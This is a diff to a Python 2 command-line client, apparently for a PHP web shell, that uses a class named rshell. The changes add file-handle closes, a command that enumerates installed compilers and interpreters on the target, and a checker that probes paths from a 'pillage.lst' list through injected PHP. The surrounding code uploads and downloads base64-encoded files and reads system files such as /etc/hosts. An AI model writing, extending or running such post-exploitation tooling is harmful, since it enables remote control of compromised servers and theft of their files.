@@ -96,6 +96,7 @@ class rshell(Cmd):
         if code == 200:
             f = file(os.path.basename(files[0]), "w")
             f.write(base64.decodestring(data))
+            f.close()
         else:
             print "Error"
 
@@ -104,6 +105,7 @@ class rshell(Cmd):
         f = file(filename)
         fname = os.path.basename(filename)
         data = base64.encodestring(f.read()).replace("\n", "")
+        f.close()
         cmd = "file_put_contents('{0}/{1}',base64_decode('{2}'));".format(destination,fname, data)
         (code, data) = self.dorequest(cmd)
         if code == 200:
@@ -124,6 +126,7 @@ class rshell(Cmd):
         self.do_download("{0} {1}".format(filename, filename))
 
     def do_getsysinfo(self, line):
+        #Print user and system information
         print "=" * 80
         print "User name:"
         print "-" * 80
@@ -169,3 +172,40 @@ class rshell(Cmd):
         print "-" * 80
         cmd = "cat /etc/hosts"
         self.default(cmd)
+
+    def do_getswversion(self, line):
+        #Print some software versions
+        print "=" * 80
+        print "Software versions:"
+        print "-" * 80
+        cmd = "gcc -v"
+        self.default(cmd)
+        print "-" * 80
+        cmd = "mysql --version"
+        self.default(cmd)
+        print "-" * 80
+        cmd = "perl -v Returns"
+        self.default(cmd)
+        print "-" * 80
+        cmd = "ruby -v Returns"
+        self.default(cmd)
+        print "-" * 80
+        cmd = "python --version"
+        self.default(cmd)
+        print "-" * 80
+
+    def file_exists(self, filename):
+        cmd = "if (file_exists('{0}')) echo 1;".format(filename)
+        (code, response) = self.dorequest(cmd)
+        if code == 200:
+            if response.replace("\n", "") == "1":
+                print filename + " exist"
+        else:
+            print "Error"
+
+    def do_check_files(self, line):
+        filelist = file("pillage.lst")
+        for filename in filelist:
+            #Check filename, [:-1] to remove eol
+            self.file_exists(filename[:-1])
+        filelist.close()
